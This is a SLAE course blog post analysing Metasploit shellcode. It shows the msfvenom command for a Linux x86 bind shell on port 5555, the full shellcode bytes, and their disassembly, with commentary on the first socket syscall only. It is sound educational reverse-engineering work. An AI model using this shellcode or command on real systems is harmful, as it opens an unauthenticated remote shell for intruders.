---
layout: single
title: SLAE Assignment 5 -- MSF Analysis
date: 2019-5-12
classes: wide
header:
  teaser: /assets/images/SLAE/SLAE.jpg
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
  - MSF
  - msfvenom
--- 
![](/assets/images/SLAE/SLAE.jpg)

## Introduction

The 5th assignment for SLAE is to analyze 3 msfvenom payloads. For this excercise, I thought I would revisit some semi-familiar code in the `linux/x86/shell_bind_tcp`, `linux/x86/shell_reverse_tcp`, and `linux/x86/exec` payloads. My primary reason for doing this is because we've written similar code already and I want to see how the pros do it at Metasploit and see if we can pick up some new tricks/efficiencies. 

## Analyzing Shellcode #1 (`linux/x86/shell_bind_tcp`)

The first thing we need to do is generate the shellcode that corresponds with this MSF payload. We'll need to add arguments as well, such as designate a listening port. We can do this with the following command: `msfvenom -p linux/x86/shell_bind_tcp lport=5555 -f c`

```terminal_session
root@kali:~# msfvenom -p linux/x86/shell_bind_tcp lport=5555 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 78 bytes
Final size of c file: 354 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\x02\x00\x15\xb3\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";
```

Now that we have our shellcode, we can feed it to `ndisasm`, which comes stock on Kali Linux, with the following command and get some assembly out of it!

```terminal_session
root@kali:~# echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x15\xb3\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" | ndisasm -u -
```
After running this command, we get the following output:

```terminal_session
00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  5B                pop ebx
00000010  5E                pop esi
00000011  52                push edx
00000012  68020015B3        push dword 0xb3150002
00000017  6A10              push byte +0x10
00000019  51                push ecx
0000001A  50                push eax
0000001B  89E1              mov ecx,esp
0000001D  6A66              push byte +0x66
0000001F  58                pop eax
00000020  CD80              int 0x80
00000022  894104            mov [ecx+0x4],eax
00000025  B304              mov bl,0x4
00000027  B066              mov al,0x66
00000029  CD80              int 0x80
0000002B  43                inc ebx
0000002C  B066              mov al,0x66
0000002E  CD80              int 0x80
00000030  93                xchg eax,ebx
00000031  59                pop ecx
00000032  6A3F              push byte +0x3f
00000034  58                pop eax
00000035  CD80              int 0x80
00000037  49                dec ecx
00000038  79F8              jns 0x32
0000003A  682F2F7368        push dword 0x68732f2f
0000003F  682F62696E        push dword 0x6e69622f
00000044  89E3              mov ebx,esp
00000046  50                push eax
00000047  53                push ebx
00000048  89E1              mov ecx,esp
0000004A  B00B              mov al,0xb
0000004C  CD80              int 0x80
```

This output is very nice, but it's not quite what we're accustomed to. Let's use `awk` to get just the assembly instructions.

`echo -ne "<SHELLCODE>" | ndisasm -u - | awk '{ print $3,$4,$5 }'`

Now we get just the assembly to print to the terminal and we can throw this into a NASM sytnax highlighter.

```nasm
xor ebx,ebx 
mul ebx 
push ebx 
inc ebx 
push ebx 
push byte +0x2
mov ecx,esp 
mov al,0x66 
int 0x80 
pop ebx 
pop esi 
push edx 
push dword 0xb3150002
push byte +0x10
push ecx 
push eax 
mov ecx,esp 
push byte +0x66
pop eax 
int 0x80 
mov [ecx+0x4],eax 
mov bl,0x4 
mov al,0x66 
int 0x80 
inc ebx 
mov al,0x66 
int 0x80 
xchg eax,ebx 
pop ecx 
push byte +0x3f
pop eax 
int 0x80 
dec ecx 
jns 0x32 
push dword 0x68732f2f
push dword 0x6e69622f
mov ebx,esp 
push eax 
push ebx 
mov ecx,esp 
mov al,0xb 
int 0x80
```

Let's break this down and see how it differs from our bind shell that we wrote. 

#### Syscall 1 `socketcall()`

```nasm
xor ebx,ebx
mul ebx
push ebx
inc ebx
push ebx
push byte
mov ecx,esp
mov al,0x66
int 0x80
```

One thing that's different is the way they're clearing the registers. By using `mul` which has storage destinations of `eax` and `edx`, they're able to save a line of code by not having to specify `xor register, register` twice. 



## Github

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1458

You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment4)




